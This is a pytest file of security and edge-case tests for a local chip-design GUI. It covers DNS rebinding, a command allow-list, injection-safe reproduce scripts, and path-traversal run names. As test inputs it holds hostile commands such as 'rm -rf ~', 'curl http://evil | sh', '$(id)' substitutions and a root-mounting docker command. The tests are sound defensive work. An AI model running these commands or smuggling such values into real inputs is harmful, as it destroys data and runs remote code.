# Copyright 2026 LanEx Contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
"""Attacks on and edge cases of the code added in the 2026-10-28 polish pass:
DNS rebinding, the Console command runner, reproduce scripts from someone
else's run, sweep parameters, runs into a missing project folder, old sweep
times without a zone, and corrupt or very many run folders."""
from __future__ import annotations

import contextlib
import json
import os
import shlex
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.parse
from http.client import HTTPConnection
from pathlib import Path

import pytest

from lanex.controller import dse, history, manualcmd, platform_env


# ------------------------------------------------------------------ helpers
class _Headers(dict):
    def get(self, k, d=None):  # case-insensitive like http.client's
        for kk, v in self.items():
            if kk.lower() == k.lower():
                return v
        return d


class _H:
    def __init__(self, body=None, headers=None, path="/"):
        self._body = body or {}
        self.headers = _Headers(headers or {})
        self.path = path


@pytest.fixture
def got(monkeypatch):
    from lanex.server import routes
    out = {}
    monkeypatch.setattr(routes, "_respond", lambda h, payload, code=200: out.update(payload=payload, code=code))
    return out


class _Runner:
    def __init__(self, running=False):
        self.running = running
        self.started = None
        self.run_dir = None
        self.error = None

    def start(self, **kw):
        self.started = kw
        return {"ok": True}


@pytest.fixture(autouse=True)
def _iso(tmp_path, monkeypatch):
    monkeypatch.setenv("LANEX_HOME", str(tmp_path / "home"))
    history._SUMMARY_CACHE.clear()
    history._START_CACHE.clear()
    yield
    dse.job.cancel()


# ------------------------------------------------------------------ DNS rebinding
@pytest.mark.parametrize("host,ok", [
    (None, True), ("", True), ("127.0.0.1:8765", True), ("localhost:8765", True), ("LOCALHOST", True),
    ("[::1]:8765", True), ("lanex.localhost:8765", True), ("localhost.", True),
    ("evil.example:8765", False), ("127.0.0.1.nip.io:8765", False), ("localhost.evil.com", False),
    ("[::1", False), ("10.0.0.5:8765", False),
])
def test_host_header_must_name_loopback(host, ok):
    from lanex.server.app import host_is_loopback
    assert host_is_loopback(host) is ok


def _pick_port() -> int:
    with contextlib.closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture(scope="module")
def live_server():
    from lanex.server.app import make_server
    httpd, port = make_server(host="127.0.0.1", port=_pick_port())
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    for _ in range(100):
        try:
            c = HTTPConnection("127.0.0.1", port, timeout=1)
            c.request("GET", "/api/health")
            if c.getresponse().status == 200:
                break
        except Exception:
            time.sleep(0.05)
    yield port
    httpd.shutdown()
    httpd.server_close()


def _req(port, method, path, host, body=None, extra=None):
    c = HTTPConnection("127.0.0.1", port, timeout=5)
    c.putrequest(method, path, skip_host=True)
    c.putheader("Host", host)
    for k, v in (extra or {}).items():
        c.putheader(k, v)
    data = json.dumps(body or {}).encode() if method == "POST" else None
    if data is not None:
        c.putheader("Content-Type", "application/json")
        c.putheader("Content-Length", str(len(data)))
    c.endheaders(data)
    r = c.getresponse()
    return r.status, r.read().decode("utf-8", "replace")


def test_a_rebound_domain_is_refused_for_reads_and_commands(live_server):
    st, body = _req(live_server, "GET", "/api/health", f"attacker.example:{live_server}")
    assert st == 403 and "127.0.0.1" in body
    # Origin == Host passes the old same-origin check; the Host check stops it.
    st, _ = _req(live_server, "POST", "/api/manual/run", f"attacker.example:{live_server}",
                 {"command": "yosys -p '!id'"},
                 {"X-Requested-With": "XMLHttpRequest", "Origin": f"http://attacker.example:{live_server}"})
    assert st == 403
    st, _ = _req(live_server, "GET", "/api/health", f"127.0.0.1:{live_server}")
    assert st == 200


# ------------------------------------------------------------------ Console runner
@pytest.mark.parametrize("cmd", [
    "yosys -p synth; rm -rf ~", "yosys | tee x", "yosys > /etc/passwd", "librelane `id`",
    "librelane $(id)", "bash -c id", "sh -c id", "env FOO=1 yosys", "sudo yosys",
    "python -c 'import os'", "python3 -m pip install x", "docker run -v /:/host alpine",
    "docker exec x sh", "podman image rm x", "rm -rf ~", "/bin/sh", "perl -e 1", "",
])
def test_console_refuses_shell_and_non_allowed(cmd):
    assert manualcmd.validate(cmd)["ok"] is False


def test_console_tokens_are_never_shell_text():
    # Quotes and newlines only ever produce literal argv words.
    v = manualcmd.validate("yosys -p 'read_verilog a.v' \n rm -rf x")
    assert v["ok"] and v["argv"][0] == "yosys" and "rm" in v["argv"]   # a file name for yosys, not a command
    assert manualcmd.validate("docker image ls")["ok"]
    assert manualcmd.validate("python3 -m librelane --version")["base"] == "librelane"


def test_console_never_runs_in_the_servers_own_folder(tmp_path):
    job = manualcmd.ManualJob()
    r = job.start("yosys -V", cwd=None)
    assert r["ok"] is False and "Open a project" in r["error"]
    r = job.start("yosys -V", cwd=str(tmp_path / "gone"))
    assert r["ok"] is False and "not there any more" in r["error"]
    assert job.running is False


@pytest.mark.skipif(os.name == "nt", reason="POSIX signals")
def test_stop_kills_a_command_that_ignores_sigterm():
    p = subprocess.Popen(["bash", "-c", "trap '' TERM; sleep 30 & wait"], start_new_session=True)
    time.sleep(0.3)
    t0 = time.time()
    manualcmd.ManualJob._terminate(p, grace=0.5)
    p.wait(timeout=10)
    assert time.time() - t0 < 8


@pytest.mark.skipif(not shutil.which("yosys") and not shutil.which("dot"), reason="needs an allow-listed tool")
def test_stop_before_the_process_starts_still_stops_it(tmp_path, monkeypatch):
    prog = "dot" if shutil.which("dot") else "yosys"
    job = manualcmd.ManualJob()
    orig = subprocess.Popen

    def slow_popen(*a, **kw):
        job.cancel()            # Stop lands between "running" and the process existing
        return orig(*a, **kw)
    monkeypatch.setattr(manualcmd.subprocess, "Popen", slow_popen)
    assert job.start(prog + (" -Tsvg" if prog == "dot" else ""), cwd=str(tmp_path))["ok"]
    job._thread.join(15)
    assert not job.running


def _design(tmp_path: Path, name="proj") -> Path:
    d = tmp_path / name
    d.mkdir()
    (d / "config.json").write_text(json.dumps({"DESIGN_NAME": "x", "VERILOG_FILES": "dir::x.v"}))
    (d / "x.v").write_text("module x; endmodule\n")
    return d


def test_console_refuses_a_project_the_window_does_not_show(monkeypatch, tmp_path, got):
    from lanex.server import routes
    a, b = _design(tmp_path, "a"), _design(tmp_path, "b")
    monkeypatch.setattr(routes, "_get_active_design_dir", lambda: str(a))
    routes.h_manual_run(_H({"command": "yosys -V"}, {"X-LanEx-Design": urllib.parse.quote(str(b))}))
    assert got["code"] == 409 and str(b) in got["payload"] and "not run" in got["payload"]
    gone = tmp_path / "moved away é"
    routes.h_manual_run(_H({"command": "yosys -V"}, {"X-LanEx-Design": urllib.parse.quote(str(gone))}))
    assert got["code"] == 409 and "not there any more" in got["payload"] and str(gone) in got["payload"]
    routes.h_manual_run(_H({"command": ["yosys"]}))
    assert got["code"] == 400


def test_console_librelane_waits_for_a_live_run(monkeypatch, tmp_path, got):
    from lanex.server import app, routes
    a = _design(tmp_path, "a")
    monkeypatch.setattr(routes, "_get_active_design_dir", lambda: str(a))
    monkeypatch.setattr(app, "get_runner", lambda: _Runner(running=True))
    routes.h_manual_run(_H({"command": "librelane --dockerized config.json"}))
    assert got["code"] == 409 and "run is in progress" in got["payload"]
    # Asking librelane its version is not a second flow.
    monkeypatch.setattr(manualcmd.ManualJob, "_run", lambda self, *a: setattr(self, "_running", False))
    monkeypatch.setattr(manualcmd, "_JOB", manualcmd.ManualJob())
    routes.h_manual_run(_H({"command": "librelane --version"}))
    assert got["code"] == 200


# ------------------------------------------------------------------ runs into the wrong folder
def test_design_refusal_cases(tmp_path):
    from lanex.server import routes
    a, b = _design(tmp_path, "a"), _design(tmp_path, "b")
    assert routes._design_refusal(_H(), str(a)) is None
    assert routes._design_refusal(_H(headers={"X-LanEx-Design": urllib.parse.quote(str(a) + "/")}), str(a)) is None
    assert "not there any more" in routes._design_refusal(_H(), str(tmp_path / "nope"))
    msg = routes._design_refusal(_H(headers={"X-LanEx-Design": urllib.parse.quote(str(b))}), str(a))
    assert msg and "Reload" in msg
    uni = tmp_path / "chip ₹ é"
    uni.mkdir()
    assert routes._design_refusal(_H(headers={"X-LanEx-Design": urllib.parse.quote(str(uni))}), str(uni)) is None


def test_run_start_and_resume_refuse_a_missing_folder(monkeypatch, tmp_path, got):
    from lanex.server import app, routes
    a = _design(tmp_path, "a")
    runner = _Runner()
    monkeypatch.setattr(app, "get_runner", lambda: runner)
    monkeypatch.setattr(routes, "_get_active_design_dir", lambda: str(a))
    gone = str(tmp_path / "renamed")
    hdr = {"X-LanEx-Design": urllib.parse.quote(gone)}
    routes.h_run_start(_H({}, hdr))
    assert got["code"] == 409 and "not there any more" in got["payload"]
    # Resume from a stage (branch_from) and the fix sheet go through the same gate.
    routes.h_run_start(_H({"branch_from": {"tag": "r1", "step": "OpenROAD.Floorplan"}}, hdr))
    assert got["code"] == 409 and "Nothing was started" in got["payload"]
    routes.h_fix_apply(_H({"tag": "r1", "sets": {"X": 1}}, hdr))
    assert got["code"] == 409
    # The open project itself deleted under LanEx.
    shutil.rmtree(a)
    data, status = routes._start_run({})
    assert status == 409 and "not there any more" in data
    assert runner.started is None


@pytest.mark.parametrize("tag", ["../../escape", "a/b", "..", "-rf", "x y", "a\nb", "é" * 3, "x" * 121])
def test_run_names_that_leave_runs_are_refused(monkeypatch, tmp_path, tag):
    from lanex.server import app, routes
    a = _design(tmp_path, "a")
    runner = _Runner()
    monkeypatch.setattr(app, "get_runner", lambda: runner)
    monkeypatch.setattr(routes, "_get_active_design_dir", lambda: str(a))
    data, status = routes._start_run({"tag": tag})
    assert status == 400 and "can't be used" in data and runner.started is None


def test_a_run_waits_for_a_sweep_and_a_sweep_for_a_run(monkeypatch, tmp_path, got):
    from lanex.server import app, routes
    a = _design(tmp_path, "a")
    monkeypatch.setattr(routes, "_get_active_design_dir", lambda: str(a))
    monkeypatch.setattr(app, "get_runner", lambda: _Runner(running=False))
    monkeypatch.setattr(type(dse.job), "active", property(lambda self: True))
    data, status = routes._start_run({})
    assert status == 409 and "sweep is running" in data
    monkeypatch.setattr(type(dse.job), "active", property(lambda self: False))
    monkeypatch.setattr(app, "get_runner", lambda: _Runner(running=True))
    routes.h_dse_start(_H({"axes": [{"var": "FP_CORE_UTIL", "values": [40, 50]}]}))
    assert got["code"] == 409 and "run is in progress" in got["payload"]


# ------------------------------------------------------------------ sweep parameters
@pytest.mark.parametrize("axes,needle", [
    ([{"var": "FP_CORE_UTIL=1 -c X", "values": [1]}], "not a LibreLane setting"),
    ([{"var": "fp_core_util", "values": [1]}], "not a LibreLane setting"),
    ([{"var": "FP_CORE_UTIL", "values": [1]}, {"var": "FP_CORE_UTIL", "values": [2]}], "twice"),
    ([{"var": "FP_CORE_UTIL", "values": "40"}], "no values"),
    ([{"var": "FP_CORE_UTIL", "values": [{"a": 1}]}], "number or a word"),
    ([{"var": "FP_CORE_UTIL", "values": ["40\n-c FOO=1"]}], "line break"),
    (["FP_CORE_UTIL"], "expected form"),
])
def test_sweep_values_that_could_read_as_more_are_refused(monkeypatch, axes, needle):
    monkeypatch.setattr(dse, "_known_var_names", lambda: frozenset())
    with pytest.raises(ValueError, match=needle):
        dse.expand_sweep({"axes": axes})


def test_a_huge_sweep_is_refused_before_it_is_built(monkeypatch):
    monkeypatch.setattr(dse, "_known_var_names", lambda: frozenset())
    axes = [{"var": f"V{i}", "values": list(range(1000))} for i in range(4)]
    t0 = time.time()
    with pytest.raises(ValueError, match="max"):
        dse.expand_sweep({"axes": axes})
    assert time.time() - t0 < 1.0


def test_sweep_run_names_stay_inside_runs(tmp_path):
    tags = dse.sweep_run_tags(tmp_path, [{"FP_CORE_UTIL": "../../x"}, {"CLOCK_PERIOD": "a/b c"}])
    for t in tags:
        assert "/" not in t and " " not in t and t.startswith("sweep-")


# ------------------------------------------------------------------ reproduce from someone else's run
def test_reproduce_script_from_an_imported_run_cannot_run_extra_commands(tmp_path):
    meta = {
        "tag": "r1\nrm -rf ~",
        "cli_command": {"recommended": "container",
                        "container": "librelane --dockerized config.json; curl http://evil | sh",
                        "local": "rm -rf ~", "cwd": "/home/u/my chip's \"files\" é"},
        "config_file": "/home/u/my chip's/config.json", "config_hash": "abc\nrm -rf ~",
        "toolchain": {"librelane_version": "3.0.4\ncurl evil | sh", "image": "img; id"},
        "pdk": "sky130A\nid",
    }
    info = manualcmd.reproduce_info(meta, {"PDK_ROOT": "/x"}, str(tmp_path / "r1"))
    script = manualcmd.reproduce_script(info)
    for line in script.splitlines():
        if not line or line.startswith("#"):
            continue
        words = shlex.split(line)
        # Every command line is one of the script's own, with data only as quoted words.
        assert words[0] in ("set", "cd", "echo", "export", "librelane"), line
    run_line = [l for l in script.splitlines() if l.startswith("librelane")]
    assert len(run_line) == 1
    words = shlex.split(run_line[0])
    # "; curl … | sh" arrives as plain words for librelane, never as shell syntax.
    assert words[:3] == ["librelane", "--dockerized", "config.json;"] and "|" in words
    assert "'config.json;'" in run_line[0] and "'|'" in run_line[0]
    assert "img; id" not in script.replace("'img; id'", "")
    cd = [l for l in script.splitlines() if l.startswith("cd ")][0]
    assert shlex.split(cd)[1] == "/home/u/my chip's \"files\" é"
    if shutil.which("bash"):
        assert subprocess.run(["bash", "-n"], input=script, text=True).returncode == 0


def test_reproduce_drops_a_recorded_command_that_is_not_librelane(tmp_path):
    meta = {"cli_command": {"recommended": "local", "local": "rm -rf ~", "container": "sh -c id"}}
    info = manualcmd.reproduce_info(meta, None, str(tmp_path / "r"))
    assert info["command"] is None and info["recorded"] is False and info["commands"] == {}


# ------------------------------------------------------------------ old sweep times
def test_old_sweep_times_are_read_as_the_machine_clock_and_labelled(tmp_path):
    d = tmp_path / "d"
    d.mkdir()
    (d / ".gui-dse-sweeps.json").write_text(json.dumps({"sweeps": [
        {"id": "old", "created_at": "2026-10-27T10:00:00"},
        {"id": "new", "created_at": "2026-10-27T15:00:00+05:30"},   # 09:30 UTC: older than "old"
        "garbage", None,
    ]}))
    sw = dse.load_sweeps(d)
    assert [s["id"] for s in sw] == ["old", "new"]       # by instant, not by string
    old = sw[0]
    from datetime import datetime
    assert datetime.fromisoformat(old["created_at"]).utcoffset() is not None
    assert "without a time zone" in old["created_at_note"]
    assert "created_at_note" not in sw[1]
    # The label survives the manifest being written back (record_point).
    dse.record_point(d, "old", "t1", {"ok": True})
    again = {s["id"]: s for s in dse.load_sweeps(d)}
    assert "created_at_note" in again["old"] and again["old"]["results"]["t1"]["ok"] is True


def test_an_unreadable_sweep_list_is_kept_aside_not_overwritten(tmp_path):
    d = tmp_path / "d"
    d.mkdir()
    (d / ".gui-dse-sweeps.json").write_text('{"sweeps": [{"id": "a", ')
    assert dse.load_sweeps(d) == []
    dse.record_sweep(d, {"id": "b", "created_at": "2026-10-28T10:00:00+00:00"})
    assert [s["id"] for s in dse.load_sweeps(d)] == ["b"]
    kept = list(d.glob(".gui-dse-sweeps.json.unreadable-*"))
    assert kept and kept[0].read_text().startswith('{"sweeps": [{"id": "a"')


# ------------------------------------------------------------------ local time header
@pytest.mark.parametrize("bad", ["", "abc", "1e9", "99999", "-99999", "330; DROP", None, "3.5"])
def test_garbage_utc_offsets_are_ignored(monkeypatch, bad):
    monkeypatch.setattr(platform_env, "_client_utc_offset_min", 330)
    platform_env.note_client_utc_offset(bad)
    assert platform_env._client_utc_offset_min == 330
    assert platform_env.local_now().utcoffset().total_seconds() == 330 * 60


# ------------------------------------------------------------------ corrupt and many runs
def _good_run(design: Path, tag: str, metrics=None) -> Path:
    run = design / "runs" / tag
    (run / "final").mkdir(parents=True)
    (run / "resolved.json").write_text('{"PDK": "sky130A"}')
    (run / "final" / "metrics.json").write_text(json.dumps(metrics or {"timing__setup__ws": 0.3}))
    (run / "1-yosys-synthesis").mkdir()
    (run / "1-yosys-synthesis" / "state_in.json").write_text("{}")
    (run / "1-yosys-synthesis" / "state_out.json").write_text("{}")
    return run


def test_corrupt_and_old_run_folders_still_list(tmp_path):
    d = tmp_path / "d"
    _good_run(d, "good")
    (d / "runs" / "empty").mkdir()
    half = _good_run(d, "half-json")
    (half / "final" / "metrics.json").write_text('{"timing__setup__ws": 0.')
    nofinal = d / "runs" / "no-final"
    (nofinal / "1-yosys-synthesis").mkdir(parents=True)
    (nofinal / "1-yosys-synthesis" / "state_in.json").write_text("{")
    junk = _good_run(d, "junk-meta")
    (junk / "gui-run.json").write_text("[1, 2")
    (junk / "resolved.json").write_text("\x00\x01not json")
    weird = _good_run(d, "weird-types")
    (weird / "gui-run.json").write_text(json.dumps({"branched_from": "r0", "sweep": [1], "written_at": 5,
                                                    "outcome": "ok"}))
    (weird / "final" / "metrics.json").write_text(json.dumps([1, 2, 3]))
    (d / "runs" / "a-file.txt").write_text("not a run")
    _good_run(tmp_path / "other", "x")
    try:
        os.symlink(tmp_path / "other" / "runs" / "x", d / "runs" / "link-out")
    except (OSError, NotImplementedError):
        pass
    runs = history.list_runs(d)
    tags = {r["tag"] for r in runs}
    assert {"good", "empty", "half-json", "no-final", "junk-meta", "weird-types"} <= tags
    for r in runs:
        assert r["verdict"]["state"] in ("passed", "warning", "failed", "stopped", "running", "incomplete")
        assert isinstance(r["started_at"], str) and r["started_at"]
    by = {r["tag"]: r for r in runs}
    assert by["empty"]["verdict"]["state"] != "passed"
    assert by["half-json"]["verdict"]["state"] != "passed"   # unreadable metrics are never a pass


def test_three_hundred_runs_list_fast(tmp_path):
    d = tmp_path / "d"
    for i in range(300):
        _good_run(d, f"glui-20261028-{i:06d}", {"timing__setup__ws": 0.1 * (i % 7) - 0.2})
    t0 = time.time()
    runs = history.list_runs(d)
    cold = time.time() - t0
    t0 = time.time()
    again = history.list_runs(d)
    warm = time.time() - t0
    assert len(runs) == len(again) == 300
    assert cold < 30, cold
    assert warm < 3, warm
    assert len({r["tag"] for r in runs}) == 300
